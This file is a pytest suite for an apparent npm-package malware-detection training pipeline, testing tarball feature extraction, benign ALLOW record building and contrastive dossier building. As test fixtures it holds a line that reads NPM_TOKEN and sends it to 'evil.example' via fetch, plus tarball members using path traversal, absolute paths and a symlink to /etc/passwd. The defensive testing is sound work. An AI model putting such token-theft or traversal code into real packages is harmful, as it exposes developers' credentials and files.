"""Smoke tests for the corpus ingestion scripts (tasks 36, 37, 38).

These build a tiny SYNTHETIC benign tarball in a temp dir and run the
static feature extraction, benign SFT builder, and contrastive dossier
builder against it. No real corpus and no real malware are required: the
synthetic ``package/package.json`` has a postinstall hook and
``package/index.js`` contains a ``require('child_process')`` line, which
exercises the lifecycle-script and process-execution detectors.

The scripts have hyphenated filenames so they are loaded by path with
importlib rather than a normal import.
"""

from __future__ import annotations

import importlib.util
import io
import json
import tarfile
from pathlib import Path
from types import ModuleType

import pytest

_REPO_ROOT = Path(__file__).resolve().parents[3]
_SCRIPTS = _REPO_ROOT / "finetune" / "scripts"


def _load_script(name: str) -> ModuleType:
    path = _SCRIPTS / name
    spec = importlib.util.spec_from_file_location(
        f"mw_script_{name.replace('-', '_').replace('.py', '')}", path
    )
    assert spec is not None and spec.loader is not None
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


@pytest.fixture(scope="module")
def extractor() -> ModuleType:
    return _load_script("extract-tarball-features.py")


@pytest.fixture(scope="module")
def benign_builder() -> ModuleType:
    return _load_script("build-benign-sft-records.py")


@pytest.fixture(scope="module")
def dossier_builder_script() -> ModuleType:
    return _load_script("build-dossiers-from-corpus.py")


def _add_text_member(tf: tarfile.TarFile, name: str, content: str) -> None:
    data = content.encode("utf-8")
    info = tarfile.TarInfo(name=name)
    info.size = len(data)
    tf.addfile(info, io.BytesIO(data))


def _write_synthetic_benign_tgz(path: Path) -> None:
    """A tiny benign npm tarball: package.json + index.js.

    package.json carries a postinstall lifecycle hook; index.js requires
    child_process. Both are detected statically as text, never executed.
    """
    pkg_json = json.dumps(
        {
            "name": "synthetic-benign",
            "version": "1.0.0",
            "main": "index.js",
            "scripts": {"postinstall": "node setup.js"},
            "dependencies": {},
            "devDependencies": {"jest": "^29.0.0"},
        },
        indent=2,
    )
    index_js = (
        "'use strict';\n"
        "const cp = require('child_process');\n"
        "module.exports = function run() { return cp; };\n"
    )
    with tarfile.open(path, mode="w:gz") as tf:
        _add_text_member(tf, "package/package.json", pkg_json)
        _add_text_member(tf, "package/index.js", index_js)


def _write_clean_benign_tgz(path: Path, name: str = "clean-benign") -> None:
    """A genuinely clean benign npm tarball: no install script, no sensitive caps.

    This is the ideal ALLOW negative. Lifecycle scripts (even benign
    ones) count as a sensitive capability under the labeling rubric and
    push a cold-start dossier to quarantine, so a clean ALLOW record
    needs a package with no install hook and no network / exec markers.
    """
    pkg_json = json.dumps(
        {
            "name": name,
            "version": "1.0.0",
            "main": "index.js",
            "dependencies": {},
            "devDependencies": {"jest": "^29.0.0"},
        },
        indent=2,
    )
    index_js = (
        "'use strict';\n"
        "module.exports = function add(a, b) { return a + b; };\n"
    )
    with tarfile.open(path, mode="w:gz") as tf:
        _add_text_member(tf, "package/package.json", pkg_json)
        _add_text_member(tf, "package/index.js", index_js)


def _write_malicious_member_tgz(path: Path) -> None:
    """A tarball whose member set includes hostile names + a symlink.

    Used to prove the reject filter drops absolute paths, ``..``
    traversal, and link members. The legitimate package.json is still
    present so the scan still finds it.
    """
    with tarfile.open(path, mode="w:gz") as tf:
        # legitimate member
        _add_text_member(tf, "package/package.json", '{"name":"x","version":"1.0.0"}')
        # absolute path member (must be rejected)
        _add_text_member(tf, "/etc/evil.txt", "pwned")
        # traversal member (must be rejected)
        _add_text_member(tf, "package/../../escape.txt", "pwned")
        # symlink member (must be rejected)
        link = tarfile.TarInfo(name="package/link")
        link.type = tarfile.SYMTYPE
        link.linkname = "/etc/passwd"
        tf.addfile(link)


@pytest.fixture()
def synthetic_corpus(tmp_path: Path) -> dict[str, Path]:
    """Build a synthetic corpus_root + artifact-index.jsonl in tmp_path."""
    corpus = tmp_path / "corpus"
    benign_dir = corpus / "benign" / "synthetic-benign"
    vuln_dir = corpus / "vulnerable" / "synthetic-benign"
    benign_dir.mkdir(parents=True)
    vuln_dir.mkdir(parents=True)

    benign_tgz = benign_dir / "1.0.0.tgz"
    vuln_tgz = vuln_dir / "0.9.0.tgz"
    _write_synthetic_benign_tgz(benign_tgz)
    # The "vulnerable" side reuses the benign archive shape for the smoke
    # test; the real corpus supplies genuine differing trees. We only need
    # two readable local tarballs to exercise the diff path.
    _write_synthetic_benign_tgz(vuln_tgz)

    index = corpus / "artifact-index.jsonl"
    rows = [
        {
            "schema_version": "modulewarden.raw_bundle_artifact.v1",
            "bucket": "benign",
            "role": "first_patched",
            "package": "synthetic-benign",
            "version": "1.0.0",
            "path": str(benign_tgz),
            "advisory_ids": ["GHSA-test-0001"],
            "case_ids": ["case_synthetic_001"],
        },
        {
            "schema_version": "modulewarden.raw_bundle_artifact.v1",
            "bucket": "vulnerable",
            "role": "likely_affected",
            "package": "synthetic-benign",
            "version": "0.9.0",
            "path": str(vuln_tgz),
            "advisory_ids": ["GHSA-test-0001"],
            "case_ids": ["case_synthetic_001"],
        },
    ]
    index.write_text(
        "\n".join(json.dumps(r) for r in rows) + "\n", encoding="utf-8"
    )
    return {
        "corpus": corpus,
        "index": index,
        "benign_tgz": benign_tgz,
        "vuln_tgz": vuln_tgz,
    }


# --- Task 36: extract-tarball-features.py ---------------------------------


def test_extract_features_on_synthetic_tarball(extractor, synthetic_corpus):
    with tarfile.open(synthetic_corpus["benign_tgz"], mode="r:*") as tf:
        row = extractor.extract_artifact_features(
            tf, package="synthetic-benign", version="1.0.0", bucket="benign"
        )
    assert row["schema_version"] == "modulewarden.tarball_features.v1"
    assert row["package"] == "synthetic-benign"
    assert row["file_count"] == 2  # package.json + index.js
    assert row["has_install_script"] is True
    assert "postinstall" in row["lifecycle_hooks_present"]
    # lifecycle_script + process_execution must fire on the synthetic body
    assert row["capability_signals"]["lifecycle_script"] is True
    assert row["capability_signals"]["process_execution"] is True
    assert row["entropy"] > 0.0
    assert row["package_json_summary"]["dev_dep_count"] == 1


def test_reject_filter_drops_hostile_members(extractor, tmp_path):
    tgz = tmp_path / "hostile.tgz"
    _write_malicious_member_tgz(tgz)
    with tarfile.open(tgz, mode="r:*") as tf:
        row = extractor.extract_artifact_features(
            tf, package="x", version="1.0.0", bucket="vulnerable"
        )
    # 3 hostile members rejected; only the legit package.json survives
    assert row["rejected_members"] == 3
    assert row["file_count"] == 1


def test_extract_process_index_writes_jsonl(extractor, synthetic_corpus, tmp_path):
    out = tmp_path / "tarball-features.jsonl"
    manifest = extractor.process_index(
        synthetic_corpus["index"],
        out,
        corpus_root=None,
        max_artifacts=None,
        max_tarball_bytes=extractor.MAX_TARBALL_BYTES,
        local_corpus_only=True,
    )
    assert manifest["written"] == 2
    assert out.exists()
    lines = [json.loads(x) for x in out.read_text().splitlines() if x.strip()]
    assert len(lines) == 2
    assert all("tgz_sha256" in r for r in lines)
    assert "benign" in manifest["capability_distribution"]


def test_partial_files_are_skipped(extractor, synthetic_corpus, tmp_path):
    # Append a .partial artifact; it must be skipped, not opened.
    partial = synthetic_corpus["corpus"] / "benign" / "x" / "1.0.0.tgz.partial"
    partial.parent.mkdir(parents=True, exist_ok=True)
    partial.write_bytes(b"incomplete download")
    idx = tmp_path / "index-with-partial.jsonl"
    rows = synthetic_corpus["index"].read_text().splitlines()
    rows.append(
        json.dumps(
            {
                "bucket": "benign",
                "package": "x",
                "version": "1.0.0",
                "path": str(partial),
                "case_ids": ["case_partial"],
            }
        )
    )
    idx.write_text("\n".join(rows) + "\n", encoding="utf-8")
    out = tmp_path / "feat.jsonl"
    manifest = extractor.process_index(
        idx, out, corpus_root=None, max_artifacts=None,
        max_tarball_bytes=extractor.MAX_TARBALL_BYTES, local_corpus_only=True,
    )
    assert manifest["counters"].get("skip:partial", 0) == 1


# --- Task 37: build-benign-sft-records.py ---------------------------------


def test_benign_builder_emits_allow_record(benign_builder, tmp_path):
    # A genuinely clean benign package (no install script, no sensitive
    # caps) is the ALLOW negative this script exists to produce.
    corpus = tmp_path / "c"
    d = corpus / "benign" / "clean-benign"
    d.mkdir(parents=True)
    tgz = d / "1.0.0.tgz"
    _write_clean_benign_tgz(tgz)
    idx = corpus / "artifact-index.jsonl"
    idx.write_text(
        json.dumps(
            {
                "bucket": "benign",
                "package": "clean-benign",
                "version": "1.0.0",
                "path": str(tgz),
                "advisory_ids": ["GHSA-test-0002"],
                "case_ids": ["case_clean_001"],
            }
        )
        + "\n",
        encoding="utf-8",
    )
    out = tmp_path / "sft-benign.jsonl"
    manifest = benign_builder.process_index(
        idx,
        out,
        corpus_root=None,
        benign_bucket="benign",
        max_records=None,
        max_tarball_bytes=benign_builder.MAX_TARBALL_BYTES,
        local_corpus_only=True,
    )
    assert manifest["written"] == 1
    recs = [json.loads(x) for x in out.read_text().splitlines() if x.strip()]
    assert len(recs) == 1
    rec = recs[0]
    assert rec["schema_version"] == "modulewarden.sft_record.v1"
    assert rec["source"] == "benign_neighbor"
    assert rec["split"] in ("train", "validation", "test")
    # The assistant message is the report; verdict must be allow.
    assistant = rec["messages"][-1]["content"]
    report = json.loads(assistant)
    assert report["verdict"] == "allow"


def test_benign_builder_skips_install_script_package(benign_builder, synthetic_corpus, tmp_path):
    """The synthetic_corpus benign artifact has a postinstall + child_process.

    A lifecycle script counts as a sensitive capability under the rubric,
    so this artifact is correctly NOT emitted as a clean ALLOW negative.
    """
    out = tmp_path / "sft.jsonl"
    manifest = benign_builder.process_index(
        synthetic_corpus["index"], out, corpus_root=None, benign_bucket="benign",
        max_records=None, max_tarball_bytes=benign_builder.MAX_TARBALL_BYTES,
        local_corpus_only=True,
    )
    assert manifest["written"] == 0


def test_benign_builder_skips_sensitive(benign_builder, tmp_path):
    """A benign artifact that trips a network/exec signal is NOT mislabeled ALLOW."""
    corpus = tmp_path / "c"
    d = corpus / "benign" / "exfil-pkg"
    d.mkdir(parents=True)
    tgz = d / "1.0.0.tgz"
    with tarfile.open(tgz, mode="w:gz") as tf:
        _add_text_member(
            tf, "package/package.json", '{"name":"exfil-pkg","version":"1.0.0"}'
        )
        _add_text_member(
            tf,
            "package/steal.js",
            "const t = process.env.NPM_TOKEN; fetch('https://evil.example/' + t);\n",
        )
    idx = corpus / "artifact-index.jsonl"
    idx.write_text(
        json.dumps(
            {
                "bucket": "benign",
                "package": "exfil-pkg",
                "version": "1.0.0",
                "path": str(tgz),
                "case_ids": ["case_exfil"],
            }
        )
        + "\n",
        encoding="utf-8",
    )
    out = tmp_path / "sft.jsonl"
    manifest = benign_builder.process_index(
        idx, out, corpus_root=None, benign_bucket="benign", max_records=None,
        max_tarball_bytes=benign_builder.MAX_TARBALL_BYTES, local_corpus_only=True,
    )
    assert manifest["written"] == 0
    assert manifest["counters"].get("skip:sensitive_capability_not_benign", 0) == 1


# --- Task 38: build-dossiers-from-corpus.py -------------------------------


def test_corpus_dossier_contrastive_pair(dossier_builder_script, synthetic_corpus, tmp_path):
    out = tmp_path / "sft-corpus.jsonl"
    manifest = dossier_builder_script.process_index(
        synthetic_corpus["index"],
        out,
        corpus_root=None,
        max_cases=None,
        max_tarball_bytes=dossier_builder_script.MAX_TARBALL_BYTES,
        local_corpus_only=True,
    )
    # One case with both buckets -> one contrastive record.
    assert manifest["written"] == 1
    assert manifest["counters"].get("written:contrastive", 0) == 1
    recs = [json.loads(x) for x in out.read_text().splitlines() if x.strip()]
    assert len(recs) == 1
    assert recs[0]["source"] == "cve_diff"


def test_corpus_dossier_local_only_cannot_be_disabled(dossier_builder_script, synthetic_corpus, tmp_path):
    out = tmp_path / "x.jsonl"
    with pytest.raises(ValueError):
        dossier_builder_script.process_index(
            synthetic_corpus["index"], out, corpus_root=None, max_cases=None,
            max_tarball_bytes=dossier_builder_script.MAX_TARBALL_BYTES,
            local_corpus_only=False,
        )


# --- import safety: no real corpus needed ---------------------------------


def test_all_scripts_import_without_corpus(extractor, benign_builder, dossier_builder_script):
    for mod in (extractor, benign_builder, dossier_builder_script):
        assert hasattr(mod, "process_index")
        assert hasattr(mod, "main")
